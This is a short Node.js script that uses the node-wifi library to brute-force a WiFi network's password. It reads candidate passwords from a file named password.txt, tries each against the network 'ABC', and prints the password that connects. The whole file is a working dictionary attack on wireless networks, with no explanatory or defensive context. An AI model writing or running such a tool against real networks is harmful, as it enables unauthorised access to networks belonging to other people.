// Nodejs
const wifi = require("node-wifi");

wifi.init({
  iface: null,
});

async function _Connect(_ssid) {
  var fileLineArray = [];
  var lineReader = require("readline").createInterface({
    input: require("fs").createReadStream("password.txt"),
  });

  lineReader.on("line", function (line) {
    fileLineArray.push(line);
  });

  lineReader.on("close", async function () {
    for (const password of fileLineArray) {
      await new Promise((resolve, reject) => {
        wifi.connect({ ssid: _ssid, password: password }, (err) => {
          wifi.getCurrentConnections().then((e) => {
            console.log("Password: ", password);
            for (let item of e) {
              if (item?.ssid == _ssid) {
                console.log("success -------------------> ", password);
                resolve();
                return;
              }
            }
            resolve();
          });
        });
      });
    }
  });
}

_Connect("ABC");
